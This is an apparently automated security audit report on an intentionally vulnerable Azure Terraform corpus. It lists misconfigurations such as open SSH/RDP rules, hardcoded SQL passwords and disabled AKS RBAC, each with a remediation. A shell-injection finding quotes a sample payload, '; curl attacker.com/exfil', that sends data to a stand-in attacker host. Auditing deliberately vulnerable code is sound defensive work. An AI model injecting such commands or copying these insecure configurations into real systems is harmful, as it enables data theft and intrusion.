# Terraform Code Analysis Report — Azure TerraGoat

**Date:** 2026-05-06-112939
**Scope:** examples/terragoat/azure
**Files scanned:** 11 .tf files across 1 root module
**Focus:** all
**Mode:** static
**Health Grade:** F (0/100)

---

## Executive Summary

The Azure TerraGoat corpus is an intentionally vulnerable Terraform codebase structured around the OWASP Top 10 for Azure. It demonstrates every major class of Azure infrastructure security failure: world-open NSG rules (SSH/RDP), anonymous blob access, disabled RBAC on AKS, hardcoded SQL passwords, missing purge protection on Key Vault, storage accounts without network restrictions, and absent diagnostic settings. No finding here is accidental — each file maps to a specific OWASP category with documented expected detections. This is the secondary cloud corpus; Azure-specific catalogue IDs without stable rules are tagged EXPLORATORY.

**Strengths:** Provider version constraints are present with upper bounds (`~> 3.100` for azurerm, `~> 2.50` for azuread, `~> 3.2` for null); several storage accounts correctly set `enable_https_traffic_only = true` and `min_tls_version = "TLS1_2"`; Key Vault `unaudited` has `purge_protection_enabled = true`; all resources are collocated in a single resource group (`demo-rg`) for blast-radius containment.

**Finding counts by urgency:**

| Urgency | Count |
|---------|-------|
| CRITICAL | 2 |
| HIGH | 14 |
| MEDIUM | 18 |
| LOW | 2 |
| INFO | 0 |

### Finding density by file

| File | Lines | CRITICAL | HIGH | MEDIUM | LOW | Total | Density |
|------|-------|----------|------|--------|-----|-------|---------|
| 05_security_misconfiguration.tf | 93 | 2 | 3 | 1 | 0 | 6 | 6.5 |
| 01_broken_access_control.tf | 55 | 0 | 2 | 0 | 0 | 2 | 3.6 |
| 02_cryptographic_failures.tf | 56 | 0 | 2 | 1 | 0 | 3 | 5.4 |
| 03_injection.tf | 68 | 0 | 1 | 1 | 1 | 3 | 4.4 |
| 04_insecure_design.tf | 54 | 0 | 2 | 1 | 0 | 3 | 5.6 |
| 06_vulnerable_components.tf | 92 | 0 | 0 | 3 | 0 | 3 | 3.3 |
| 07_identification_auth.tf | 81 | 0 | 3 | 0 | 0 | 3 | 3.7 |
| 08_data_integrity.tf | 50 | 0 | 0 | 2 | 0 | 2 | 4.0 |
| 09_logging_monitoring.tf | 65 | 0 | 1 | 1 | 0 | 2 | 3.1 |
| 10_ssrf.tf | 72 | 0 | 1 | 1 | 0 | 2 | 2.8 |
| versions.tf | 32 | 0 | 0 | 0 | 1 | 1 | 3.1 |

---

## 1. Security Posture

### CRITICAL

- **[SEC-AZURE-NSG-001#1] NSG rule allows SSH from the internet** — 05_security_misconfiguration.tf:34 | Blast: environment | CIS: 6.2 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_network_security_group.open_ssh` contains a security rule `allow-ssh-from-anywhere` with `source_address_prefix = "*"` and `destination_port_range = "22"`. Every VM associated with this NSG is SSH-reachable from the entire internet. Brute-force SSH attacks are the most common Azure VM compromise vector.
  Recommendation: Replace `source_address_prefix = "*"` with a specific corporate CIDR or Azure Bastion service tag. For administrative access, use Azure Bastion or a jump-box with JIT access.
  Verification: `az network nsg rule show --nsg-name demo-nsg-open-ssh -g demo-rg -n allow-ssh-from-anywhere --query sourceAddressPrefix` does not return `*`.

- **[SEC-AZURE-NSG-001#2] NSG rule allows RDP from the internet** — 05_security_misconfiguration.tf:46 | Blast: environment | CIS: 6.1 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: Same NSG contains `allow-rdp-from-anywhere` with `source_address_prefix = "*"` and `destination_port_range = "3389"`. RDP is the #1 ransomware initial-access vector on Azure. BlueKeep (CVE-2019-0708) and related RDP vulns are actively exploited.
  Recommendation: Remove the rule or restrict to Azure Bastion. Never expose RDP to `*`.
  Verification: `az network nsg rule show --nsg-name demo-nsg-open-ssh -g demo-rg -n allow-rdp-from-anywhere --query sourceAddressPrefix` does not return `*`.

### HIGH

- **[SEC-AZURE-RBAC-001#1] Subscription-scope role assignment** — 01_broken_access_control.tf:35 | Blast: infrastructure-wide | CIS: n/a | Effort: Small | Status: VERIFIED
  Description: `azurerm_role_assignment.subscription_contributor` assigns the built-in `Contributor` role at `data.azurerm_subscription.primary.id` scope. The principal gains read/write authority over every resource in the subscription — the Azure equivalent of GCP's `roles/editor` at project level.
  Recommendation: Scope the role assignment to a specific resource group or resource. Use a custom RBAC role with only the required actions.
  Verification: `az role assignment list --scope /subscriptions/<sub-id> --role Contributor --query "[?principalId=='00000000-0000-0000-0000-000000000000']"` returns empty.

- **[SEC-AZURE-STORAGE-001#1] Storage account allows anonymous blob access** — 01_broken_access_control.tf:42 | Blast: single-resource | CIS: 3.7 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_storage_account.anon_blob` sets `allow_nested_items_to_be_public = true`. Combined with the container `public` having `container_access_type = "blob"` (line 54), every blob in the container is anonymously readable by anyone on the internet.
  Recommendation: Set `allow_nested_items_to_be_public = false` on the storage account and `container_access_type = "private"` on every container.
  Verification: `az storage account show -n demoanonblob1234 --query allowBlobPublicAccess` returns `false`.

- **[SEC-AZURE-STORAGE-002#1] Storage account allows non-HTTPS traffic** — 02_cryptographic_failures.tf:35 | Blast: single-resource | CIS: 3.1 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_storage_account.weak_tls` sets `enable_https_traffic_only = false`. HTTP traffic is accepted alongside HTTPS, enabling man-in-the-middle attacks. Storage account keys or SAS tokens transmitted over HTTP are trivially interceptable.
  Recommendation: Set `enable_https_traffic_only = true`.
  Verification: `az storage account show -n demoweaktls1234 --query enableHttpsTrafficOnly` returns `true`.

- **[SEC-AZURE-KV-001#1] Key Vault missing purge protection** — 02_cryptographic_failures.tf:48 | Blast: module | CIS: 8.4 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_key_vault.no_purge_protection` sets `purge_protection_enabled = false`. A principal with delete permissions can permanently destroy secrets, keys, and certificates. An attacker can delete a legitimate secret and recreate it with attacker-controlled values under the same name.
  Recommendation: Set `purge_protection_enabled = true`. Once enabled, it cannot be disabled.
  Verification: `az keyvault show --name demo-kv-no-purge --query properties.enablePurgeProtection` returns `true`.

- **[SEC-PROVISIONER-001#1] Provisioner local-exec with interpolated variable** — 03_injection.tf:64 | Blast: environment | CIS: n/a | Effort: Medium | Status: VERIFIED
  Description: `null_resource.az_cli_inject` uses `provisioner "local-exec"` with `${var.vm_name}` interpolated directly into a shell command string. An attacker controlling the tfvar can inject arbitrary shell commands (e.g. `; curl attacker.com/exfil`). Provisioners execute outside Terraform's resource model — not tracked in state, cannot be planned.
  Recommendation: Replace with a native Terraform data source or resource. If local-exec is unavoidable, use the `environment` block instead of string interpolation.
  Verification: `grep -r 'provisioner.*local-exec' examples/terragoat/azure/` returns no results.

- **[SEC-AZURE-HARDCODED-001#1] Hardcoded admin password in locals** — 04_insecure_design.tf:34 | Blast: environment | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `locals.bad_admin_password = "P@ssw0rd123!"` is used as the `administrator_login_password` for `azurerm_mssql_server.stateful` (line 52). The password is committed to version control in plaintext and appears in plan output, state files, and CI logs.
  Recommendation: Use `azurerm_key_vault_secret` data source or `random_password` resource with `sensitive = true`, storing the value in Key Vault. Never hardcode secrets in HCL.
  Verification: `grep -r 'P@ssw0rd' examples/terragoat/azure/` returns no results.

- **[SEC-AZURE-HARDCODED-001#2] Hardcoded SQL admin password** — 07_identification_auth.tf:79 | Blast: environment | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_mssql_server.sql_only` has `administrator_login_password = "ShouldBeKVRef!123"` hardcoded in HCL. Same exposure as #1 — plaintext in VCS, state, and CI.
  Recommendation: Reference a Key Vault secret or use `random_password` with `sensitive = true`.
  Verification: `grep -r 'ShouldBeKVRef' examples/terragoat/azure/` returns no results.

- **[SEC-AZURE-AKS-RBAC-001#1] AKS cluster with RBAC disabled** — 05_security_misconfiguration.tf:61 | Blast: module | CIS: n/a | Effort: Medium | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_kubernetes_cluster.no_rbac` sets `role_based_access_control_enabled = false`. Every pod in the cluster has unrestricted access to the Kubernetes API server — effectively cluster-admin. A compromised pod can read all secrets, create privileged containers, and pivot to the node.
  Recommendation: Set `role_based_access_control_enabled = true`. Enable Azure AD integration for human access with `azure_active_directory_role_based_access_control` block.
  Verification: `az aks show -n demo-aks-no-rbac -g demo-rg --query enableRbac` returns `true`.

- **[SEC-AZURE-AKS-NODEIP-001#1] AKS node pool with public IPs** — 05_security_misconfiguration.tf:72 | Blast: module | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_kubernetes_cluster.no_rbac` has `enable_node_public_ip = true` on the default node pool. Every node has a public IP, making them directly reachable from the internet. Combined with RBAC disabled, this is a complete cluster compromise path.
  Recommendation: Set `enable_node_public_ip = false`. Use a private cluster or NAT gateway for egress.
  Verification: `az aks nodepool show -n default --cluster-name demo-aks-no-rbac -g demo-rg --query enableNodePublicIp` returns `false`.

- **[SEC-AZURE-KV-AUDIT-001#1] Key Vault without diagnostic setting** — 09_logging_monitoring.tf:34 | Blast: module | CIS: 5.1.5 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_key_vault.unaudited` has no companion `azurerm_monitor_diagnostic_setting` forwarding `AuditEvent` logs to Log Analytics. Every secret read, key rotation, and certificate operation is invisible — post-incident investigation has no evidence trail.
  Recommendation: Add `azurerm_monitor_diagnostic_setting` targeting the Key Vault with `enabled_log { category = "AuditEvent" }` sending to a Log Analytics workspace.
  Verification: `az monitor diagnostic-settings list --resource <kv-resource-id> --query "value[].logs[?category=='AuditEvent']"` returns non-empty.

- **[ROB-LIFECYCLE-001#1] Stateful SQL Server missing prevent_destroy** — 04_insecure_design.tf:46 | Blast: module | CIS: n/a | Effort: Small | Status: VERIFIED
  Description: `azurerm_mssql_server.stateful` — a production SQL Server with no `lifecycle { prevent_destroy = true }`. A `terraform destroy` against the wrong workspace or a typo'd `terraform apply -destroy` permanently deletes the server and all databases.
  Recommendation: Add `lifecycle { prevent_destroy = true }`.
  Verification: Resource block contains `prevent_destroy = true`.

- **[ROB-LIFECYCLE-001#2] Stateful SQL Server missing prevent_destroy** — 07_identification_auth.tf:73 | Blast: module | CIS: n/a | Effort: Small | Status: VERIFIED
  Description: `azurerm_mssql_server.sql_only` — same pattern. SQL Server holding production databases with no prevent_destroy guard.
  Recommendation: Add `lifecycle { prevent_destroy = true }`.
  Verification: Resource block contains `prevent_destroy = true`.

- **[SEC-AZURE-SQL-AUTH-001#1] SQL Server without Entra ID admin** — 07_identification_auth.tf:73 | Blast: module | CIS: 4.4 | Effort: Medium | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_mssql_server.sql_only` has no `azuread_administrator` block. Authentication is SQL-only — shared SQL logins with manually rotated passwords. No MFA, no conditional access, no Entra ID audit trail.
  Recommendation: Add `azuread_administrator { login_username = "..." object_id = "..." }` and disable SQL authentication where possible.
  Verification: `az sql server ad-admin list -s demo-sql-only -g demo-rg` returns a configured admin.

- **[SEC-AZURE-STORAGE-KEY-001#1] Storage account key in app settings** — 07_identification_auth.tf:68 | Blast: single-resource | CIS: n/a | Effort: Medium | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_linux_web_app.key_based` passes `azurerm_storage_account.for_app.primary_access_key` directly into `app_settings.AZURE_STORAGE_KEY`. Storage account keys are long-lived, full-access credentials. They appear in plaintext in the App Service configuration and in state files.
  Recommendation: Use a User-Assigned Managed Identity with `Storage Blob Data Reader/Contributor` role assignment instead of embedding account keys.
  Verification: `az webapp config appsettings list -n demo-keybased-webapp -g demo-rg --query "[?name=='AZURE_STORAGE_KEY']"` returns empty.

- **[SEC-AZURE-WEBAPP-PUBLIC-001#1] Web App publicly reachable without restrictions** — 10_ssrf.tf:47 | Blast: single-resource | CIS: n/a | Effort: Medium | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_linux_web_app.publicly_reachable` sets `public_network_access_enabled = true` with no `ip_restriction` blocks in `site_config`. The app is reachable from every IP on the internet. A SSRF vulnerability in the app can be exploited to reach IMDS (169.254.169.254) and steal Managed Identity tokens.
  Recommendation: Add `ip_restriction` blocks to limit inbound traffic. For internal-only apps, set `public_network_access_enabled = false` and use Private Endpoints.
  Verification: `az webapp show -n demo-public-webapp -g demo-rg --query publicNetworkAccess` returns `Disabled` or IP restrictions are configured.

### MEDIUM

- **[SEC-AZURE-STORAGE-TLS-001#1] Storage account accepts TLS 1.0** — 02_cryptographic_failures.tf:42 | Blast: single-resource | CIS: 3.1 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_storage_account.weak_tls` sets `min_tls_version = "TLS1_0"`. TLS 1.0 and 1.1 are deprecated (RFC 8996). Known attacks (BEAST, POODLE) make these versions unsafe for data in transit.
  Recommendation: Set `min_tls_version = "TLS1_2"`.
  Verification: `az storage account show -n demoweaktls1234 --query minimumTlsVersion` returns `TLS1_2`.

- **[SEC-AZURE-INJECTION-001#1] VM custom_data with unvalidated variable interpolation** — 03_injection.tf:32 | Blast: single-resource | CIS: n/a | Effort: Medium | Status: NEEDS-REVIEW | EXPLORATORY
  Description: `azurerm_linux_virtual_machine.user_data_inject` interpolates `${var.vm_name}` directly into a bash script via `custom_data`. The variable has no `validation` block. An attacker controlling the tfvar can inject shell commands that execute as root at VM first boot.
  Recommendation: Add a `validation { condition = can(regex("^[a-zA-Z0-9-]+$", var.vm_name)) }` block on the variable. Better: use cloud-init structured YAML instead of raw shell.
  Verification: `var.vm_name` has a validation block constraining input to safe characters.

- **[SEC-AZURE-STORAGE-NETWORK-001#1] Storage account without network rules** — 05_security_misconfiguration.tf:81 | Blast: single-resource | CIS: 3.7 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_storage_account.open_storage` has `public_network_access_enabled = true` and no `network_rules` block. The account is reachable from any IP on the internet, despite having HTTPS and TLS 1.2 enforced.
  Recommendation: Add `network_rules { default_action = "Deny" ip_rules = [...] virtual_network_subnet_ids = [...] }` or set `public_network_access_enabled = false` with Private Endpoints.
  Verification: `az storage account show -n demoopenstorage1234 --query networkRuleSet.defaultAction` returns `Deny`.

- **[SEC-AZURE-STORAGE-NETWORK-001#2] Storage account without network rules (SSRF target)** — 10_ssrf.tf:62 | Blast: single-resource | CIS: 3.7 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_storage_account.ssrf_target` has `public_network_access_enabled = true` with no network rules. This account is explicitly positioned as a pivot target for SSRF from the companion web app. A compromised app can reach it directly over the public internet.
  Recommendation: Set `public_network_access_enabled = false` and use a Private Endpoint for the web app to reach the storage account.
  Verification: `az storage account show -n demossrftarget1234 --query networkRuleSet.defaultAction` returns `Deny`.

- **[SEC-AZURE-AKS-VERSION-001#1] AKS cluster on EOL Kubernetes version** — 06_vulnerable_components.tf:67 | Blast: module | CIS: n/a | Effort: Large | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_kubernetes_cluster.old_k8s` pins `kubernetes_version = "1.21.7"`. Kubernetes 1.21 reached end-of-life in June 2022. AKS no longer provides security patches for this version. Known CVEs (e.g., CVE-2022-3162, CVE-2022-3294) apply.
  Recommendation: Upgrade to a supported AKS version (currently 1.28+). Test workloads on a staging cluster first.
  Verification: `az aks show -n demo-aks-old -g demo-rg --query kubernetesVersion` returns a version >= 1.28.

- **[SEC-AZURE-FNAPP-RUNTIME-001#1] Function App on EOL .NET runtime** — 06_vulnerable_components.tf:50 | Blast: single-resource | CIS: n/a | Effort: Medium | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_linux_function_app.eol_runtime` uses `dotnet_version = "3.1"`. .NET Core 3.1 reached end-of-support in December 2022. Microsoft no longer ships security patches for this runtime.
  Recommendation: Upgrade to .NET 8.0 (current LTS). Set `dotnet_version = "8.0"` and `use_dotnet_isolated_runtime = true`.
  Verification: `az functionapp config show -n demo-fnapp-eol -g demo-rg --query linuxFxVersion` shows a supported runtime.

- **[MOD-PIN-001#1] Registry module missing version constraint** — 06_vulnerable_components.tf:86 | Blast: module | CIS: n/a | Effort: Small | Status: VERIFIED
  Description: `module "unpinned_aks"` uses `Azure/aks/azurerm` without a `version` constraint. Every `terraform init` pulls whatever the latest version is — breaking changes land silently.
  Recommendation: Add `version = "~> 9.0"` (or pin to the exact version in use).
  Verification: `grep 'version' 06_vulnerable_components.tf` shows a version constraint on the module block.

- **[SEC-AZURE-BLOB-SOFTDELETE-001#1] Storage account without soft delete or versioning** — 08_data_integrity.tf:30 | Blast: single-resource | CIS: 3.8 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_storage_account.no_soft_delete` has no `blob_properties` block. Blob versioning is off and soft delete is disabled — any delete is immediate and permanent. Ransomware playbooks specifically target this configuration.
  Recommendation: Add `blob_properties { versioning_enabled = true delete_retention_policy { days = 7 } container_delete_retention_policy { days = 7 } }`.
  Verification: `az storage account blob-service-properties show -n demonosoftdelete1234 --query deleteRetentionPolicy.enabled` returns `true`.

- **[SEC-AZURE-SQL-RETENTION-001#1] SQL Database without short-term retention policy** — 08_data_integrity.tf:45 | Blast: single-resource | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_mssql_database.no_retention` has no `short_term_retention_policy` block. Point-in-time restore is not configured — data corruption discovered hours later has no recovery path.
  Recommendation: Add `short_term_retention_policy { retention_days = 7 }` (or longer, per compliance requirements).
  Verification: `az sql db show -n demo-noretention -s demo-sql-only -g demo-rg --query earliestRestoreDate` returns a valid date.

- **[SEC-AZURE-NSG-FLOWLOG-001#1] NSG without flow logs** — 09_logging_monitoring.tf:48 | Blast: single-resource | CIS: 5.1.1 | Effort: Medium | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_network_security_group.unmonitored` has no companion `azurerm_network_watcher_flow_log` resource. East-west and north-south L4 traffic is invisible — lateral movement detection at the network layer is impossible.
  Recommendation: Add `azurerm_network_watcher_flow_log` targeting this NSG, sending to a storage account and Log Analytics workspace.
  Verification: `az network watcher flow-log list -l westeurope --query "[?targetResourceId contains 'demo-nsg-unmonitored']"` returns non-empty.

- **[SEC-AZURE-UAMI-SHARED-001#1] Single shared User-Assigned Managed Identity** — 04_insecure_design.tf:39 | Blast: module | CIS: n/a | Effort: Medium | Status: NEEDS-REVIEW | EXPLORATORY
  Description: `azurerm_user_assigned_identity.monolith` is named `monolith-uami` and is designed to be shared across every workload. A compromise of any compute resource inherits the union of every RBAC grant made to this identity — the Azure equivalent of a monolithic GCP service account.
  Recommendation: Create one UAMI per workload boundary with minimum RBAC role bindings scoped to the specific resources each workload needs.
  Verification: Each workload has its own dedicated UAMI.

- **[OPS-TAGS-001#1] Resource missing tags** — 04_insecure_design.tf:46 | Blast: single-resource | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_mssql_server.stateful` has no `tags` block. Resources without `environment`, `managed_by`, and `project` tags cannot be filtered in cost management, monitoring, or Azure Policy.
  Recommendation: Add `tags = { environment = "demo" managed_by = "terraform" }`.

- **[OPS-TAGS-001#2] Resource missing tags** — 05_security_misconfiguration.tf:61 | Blast: single-resource | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_kubernetes_cluster.no_rbac` has no `tags` block.

- **[OPS-TAGS-001#3] Resource missing tags** — 06_vulnerable_components.tf:67 | Blast: single-resource | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_kubernetes_cluster.old_k8s` has no `tags` block.

- **[OPS-TAGS-001#4] Resource missing tags** — 07_identification_auth.tf:73 | Blast: single-resource | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_mssql_server.sql_only` has no `tags` block.

- **[OPS-TAGS-001#5] Resource missing tags** — 09_logging_monitoring.tf:34 | Blast: single-resource | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Description: `azurerm_key_vault.unaudited` has no `tags` block.

- **[CI-TEST-001#1] Module has no Terraform tests** — examples/terragoat/azure | Blast: module | CIS: n/a | Effort: Medium | Status: NEEDS-REVIEW
  Description: No `.tftest.hcl` files exist in the Azure terragoat directory. Module contract testing is absent.
  Recommendation: Add `.tftest.hcl` files for at least the NSG, RBAC, and storage configurations. Use `terraform test` for plan-time assertions.
  Verification: `find examples/terragoat/azure -name '*.tftest.hcl' | wc -l` returns >0.

### LOW

- **[ROB-VERSION-001#1] Terraform version floor is lax** — versions.tf:10 | Blast: infrastructure-wide | CIS: n/a | Effort: Small | Status: NEEDS-REVIEW
  Description: `required_version = ">= 1.10.0"` has no upper bound. Different operators may run different Terraform major versions (including a hypothetical 2.x), causing behavior divergence and potential state incompatibility.
  Recommendation: Add an upper bound: `required_version = ">= 1.10.0, < 2.0.0"`.
  Verification: `grep required_version versions.tf` shows both lower and upper bounds.

- **[STYLE-VAR-001#1] Variable missing validation block** — 03_injection.tf:25 | Blast: single-resource | CIS: n/a | Effort: Small | Status: NEEDS-REVIEW | EXPLORATORY
  Description: `variable "vm_name"` has a `description` but no `validation` block. The variable is interpolated into a shell command (custom_data) and a provisioner — both injection vectors. Without validation, any string is accepted.
  Recommendation: Add `validation { condition = can(regex("^[a-zA-Z0-9-]+$", var.vm_name)) error_message = "vm_name must contain only alphanumeric characters and hyphens." }`.
  Verification: Variable block contains a `validation` block.

---

## 2. DRY and Code Reuse

### MEDIUM

- **[MOD-PIN-001#1] Registry module missing version constraint** — 06_vulnerable_components.tf:86 | Blast: module | CIS: n/a | Effort: Small | Status: VERIFIED
  Covered in Section 1.

---

## 3. Style and Conventions

### LOW

- **[STYLE-VAR-001#1] Variable missing validation block** — 03_injection.tf:25 | Blast: single-resource | CIS: n/a | Effort: Small | Status: NEEDS-REVIEW | EXPLORATORY
  Covered in Section 1.

---

## 4. Robustness

### HIGH

- **[ROB-LIFECYCLE-001#1] Stateful SQL Server missing prevent_destroy** — 04_insecure_design.tf:46 | Blast: module | CIS: n/a | Effort: Small | Status: VERIFIED
  Covered in Section 1.

- **[ROB-LIFECYCLE-001#2] Stateful SQL Server missing prevent_destroy** — 07_identification_auth.tf:73 | Blast: module | CIS: n/a | Effort: Small | Status: VERIFIED
  Covered in Section 1.

### MEDIUM

- **[SEC-AZURE-BLOB-SOFTDELETE-001#1] Storage account without soft delete or versioning** — 08_data_integrity.tf:30 | Blast: single-resource | CIS: 3.8 | Effort: Small | Status: VERIFIED | EXPLORATORY
  Covered in Section 1.

- **[SEC-AZURE-SQL-RETENTION-001#1] SQL Database without short-term retention policy** — 08_data_integrity.tf:45 | Blast: single-resource | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Covered in Section 1.

### LOW

- **[ROB-VERSION-001#1] Terraform version floor is lax** — versions.tf:10 | Blast: infrastructure-wide | CIS: n/a | Effort: Small | Status: NEEDS-REVIEW
  Covered in Section 1.

---

## 5. Simplicity

_No findings — section omitted._

---

## 6. Operational Readiness

### MEDIUM

- **[OPS-TAGS-001#1-5] Resources missing tags** — multiple files | Blast: single-resource | CIS: n/a | Effort: Small | Status: VERIFIED | EXPLORATORY
  Covered in Section 1. Five resources across 04, 05, 06, 07, 09 files lack `tags` blocks.

---

## 7. CI/CD and Testing Maturity

### MEDIUM

- **[CI-TEST-001#1] Module has no Terraform tests** — examples/terragoat/azure | Blast: module | CIS: n/a | Effort: Medium | Status: NEEDS-REVIEW
  Covered in Section 1.

---

## 8. Cross-Module Contracts

_No findings — section omitted._ (Single root module, no cross-module references beyond the unpinned AKS module.)

---

## 9. Stack-Specific Findings

Covered in Section 1 under SEC-AZURE-RBAC-001#1, SEC-AZURE-NSG-001#1-2, SEC-AZURE-AKS-RBAC-001#1, SEC-AZURE-AKS-NODEIP-001#1, SEC-AZURE-AKS-VERSION-001#1, SEC-AZURE-KV-001#1, SEC-AZURE-KV-AUDIT-001#1, SEC-AZURE-SQL-AUTH-001#1, SEC-AZURE-FNAPP-RUNTIME-001#1, SEC-AZURE-BLOB-SOFTDELETE-001#1, SEC-AZURE-SQL-RETENTION-001#1, SEC-AZURE-STORAGE-KEY-001#1, SEC-AZURE-NSG-FLOWLOG-001#1.

---

## 10. CLAUDE.md Compliance

_No CLAUDE.md found in examples/terragoat/azure — section omitted._

---

## 11. Suppressed Findings

_No suppressions configured — section omitted._

---

## 12. Positive Findings

- **Provider pinning:** `versions.tf` pins azurerm (`~> 3.100`), azuread (`~> 2.50`), and null (`~> 3.2`) with upper bounds via `~>`. No unbounded `>=` constraints on providers.
- **HTTPS enforcement (partial):** Storage accounts `fnapp`, `for_app`, `no_soft_delete`, `open_storage`, and `ssrf_target` all set `enable_https_traffic_only = true` and `min_tls_version = "TLS1_2"`.
- **Public blob access disabled (partial):** Storage accounts `weak_tls`, `open_storage`, `fnapp`, `for_app`, `no_soft_delete`, and `ssrf_target` set `allow_nested_items_to_be_public = false`.
- **Key Vault purge protection (partial):** `azurerm_key_vault.unaudited` correctly sets `purge_protection_enabled = true` with `soft_delete_retention_days = 7`.
- **Resource group colocation:** All resources share a single resource group (`demo-rg`) in `westeurope`, limiting cross-region blast radius.

---

## 13. Recommended Action Plan

### CRITICAL — Fix Immediately

| # | Finding | Section | Effort | Blast Radius | Description |
|---|---------|---------|--------|--------------|-------------|
| 1 | SEC-AZURE-NSG-001#1 | Security | Small | environment | Restrict SSH NSG rule `source_address_prefix` from `*` to corporate CIDR or Azure Bastion |
| 2 | SEC-AZURE-NSG-001#2 | Security | Small | environment | Restrict RDP NSG rule `source_address_prefix` from `*` to corporate CIDR or remove entirely |

### HIGH — Fix This Sprint

| # | Finding | Section | Effort | Blast Radius | Description |
|---|---------|---------|--------|--------------|-------------|
| 1 | SEC-AZURE-RBAC-001#1 | Security | Small | infrastructure-wide | Scope role assignment to resource group instead of subscription |
| 2 | SEC-AZURE-STORAGE-001#1 | Security | Small | single-resource | Set `allow_nested_items_to_be_public = false` and container to `private` |
| 3 | SEC-AZURE-STORAGE-002#1 | Security | Small | single-resource | Set `enable_https_traffic_only = true` on `weak_tls` storage account |
| 4 | SEC-AZURE-KV-001#1 | Security | Small | module | Set `purge_protection_enabled = true` on `no_purge_protection` Key Vault |
| 5 | SEC-AZURE-HARDCODED-001#1 | Security | Small | environment | Remove hardcoded password; use Key Vault reference |
| 6 | SEC-AZURE-HARDCODED-001#2 | Security | Small | environment | Remove hardcoded password; use Key Vault reference |
| 7 | SEC-AZURE-AKS-RBAC-001#1 | Security | Medium | module | Set `role_based_access_control_enabled = true` on AKS cluster |
| 8 | SEC-AZURE-AKS-NODEIP-001#1 | Security | Small | module | Set `enable_node_public_ip = false` on AKS node pool |
| 9 | SEC-PROVISIONER-001#1 | Security | Medium | environment | Replace provisioner with native resource or data source |
| 10 | SEC-AZURE-KV-AUDIT-001#1 | Security | Small | module | Add diagnostic setting for Key Vault AuditEvent logs |
| 11 | ROB-LIFECYCLE-001#1 | Robustness | Small | module | Add `prevent_destroy` to `stateful` SQL Server |
| 12 | ROB-LIFECYCLE-001#2 | Robustness | Small | module | Add `prevent_destroy` to `sql_only` SQL Server |
| 13 | SEC-AZURE-SQL-AUTH-001#1 | Security | Medium | module | Add `azuread_administrator` block to SQL Server |
| 14 | SEC-AZURE-STORAGE-KEY-001#1 | Security | Medium | single-resource | Replace storage key with Managed Identity + RBAC |
| 15 | SEC-AZURE-WEBAPP-PUBLIC-001#1 | Security | Medium | single-resource | Add IP restrictions or Private Endpoint to web app |

### MEDIUM — Plan to Address

| # | Finding | Section | Effort | Blast Radius | Description |
|---|---------|---------|--------|--------------|-------------|
| 1 | SEC-AZURE-STORAGE-TLS-001#1 | Security | Small | single-resource | Set `min_tls_version = "TLS1_2"` on `weak_tls` storage account |
| 2 | SEC-AZURE-INJECTION-001#1 | Security | Medium | single-resource | Add validation block on `vm_name`; use cloud-init YAML |
| 3 | SEC-AZURE-STORAGE-NETWORK-001#1 | Security | Small | single-resource | Add `network_rules` to `open_storage` storage account |
| 4 | SEC-AZURE-STORAGE-NETWORK-001#2 | Security | Small | single-resource | Add network rules or Private Endpoint to SSRF target storage |
| 5 | SEC-AZURE-AKS-VERSION-001#1 | Security | Large | module | Upgrade AKS from 1.21.7 to supported version (1.28+) |
| 6 | SEC-AZURE-FNAPP-RUNTIME-001#1 | Security | Medium | single-resource | Upgrade Function App from .NET 3.1 to .NET 8.0 |
| 7 | MOD-PIN-001#1 | DRY | Small | module | Pin `Azure/aks/azurerm` module to a version |
| 8 | SEC-AZURE-BLOB-SOFTDELETE-001#1 | Robustness | Small | single-resource | Enable blob versioning and soft delete |
| 9 | SEC-AZURE-SQL-RETENTION-001#1 | Robustness | Small | single-resource | Add `short_term_retention_policy` to SQL database |
| 10 | SEC-AZURE-NSG-FLOWLOG-001#1 | Security | Medium | single-resource | Add NSG flow log for `unmonitored` NSG |
| 11 | SEC-AZURE-UAMI-SHARED-001#1 | Security | Medium | module | Split monolith UAMI into per-workload identities |
| 12 | OPS-TAGS-001#1-5 | Ops | Small | single-resource | Add standard tags to all 5 untagged resources |
| 13 | CI-TEST-001#1 | CI/CD | Medium | module | Add `.tftest.hcl` test files |

### LOW — Address Opportunistically

| # | Finding | Section | Effort | Blast Radius | Description |
|---|---------|---------|--------|--------------|-------------|
| 1 | ROB-VERSION-001#1 | Robustness | Small | infrastructure-wide | Add upper bound to `required_version` |
| 2 | STYLE-VAR-001#1 | Style | Small | single-resource | Add `validation` block to `vm_name` variable |

### Related Findings

- SEC-AZURE-NSG-001#1 + SEC-AZURE-NSG-001#2: "SSH and RDP open on the same NSG — fix both rules in a single NSG hardening pass"
- SEC-AZURE-HARDCODED-001#1 + SEC-AZURE-HARDCODED-001#2 + ROB-LIFECYCLE-001#1 + ROB-LIFECYCLE-001#2: "Both SQL Servers share hardcoded passwords and no lifecycle protection — address as a single SQL security pass"
